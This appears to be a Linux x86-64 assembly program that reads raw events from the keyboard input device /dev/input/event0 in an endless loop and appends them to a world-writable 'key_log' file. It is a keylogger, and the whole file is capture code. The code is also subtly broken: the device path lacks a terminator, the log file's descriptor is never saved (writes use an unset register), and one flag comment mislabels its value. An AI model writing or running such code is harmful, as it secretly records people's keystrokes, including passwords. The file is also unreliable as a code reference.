section .data
    key_log db "key_log", 0

    event0_file_path db "/dev/input/event0"
    fd dq 0

section .bss
    buffer resb 4096

section .text
    global _start

_start:
    mov rax, 2 ; open
    mov rdi, event0_file_path
    mov rsi, 0
    mov rdx, 0
    syscall

    mov [fd], rax

reading_new_key:
    mov rax, 0 ; read
    mov rdi, [fd]
    mov rsi, buffer
    mov rdx, 4096
    syscall
    mov r8, rax

    ; if we need to display the key
    ; mov rax, 1 ; write
    ; mov rdi, 1
    ; mov rsi, buffer
    ; mov rdx, r8
    ; syscall

    jmp save_new_key

save_new_key:
    mov rax, 2 ; sys_open()
    mov rdi, key_log
    mov rsi, 2 | 64 | 1024  ; O_WRONLY | O_CREAT | O_APPEND
    mov rdx, 0777o        ; Permissions
    syscall

    mov rax, 1 ; sys_write()
    mov rdi, rbx
    mov rsi, buffer
    mov rdx, r8
    syscall

    mov rax, 3 ; sys_close()
    mov rdi, rbx
    syscall

    jmp reading_new_key

exit:
    mov rax, 3 ; close
    mov rdi, [fd]
    syscall

    mov rax, 60
    xor rdi, rdi
    syscall

; nasm -f elf64 afficher_fichier.asm ; ld afficher_fichier.o -o afficher_fichier ; ./afficher_fichier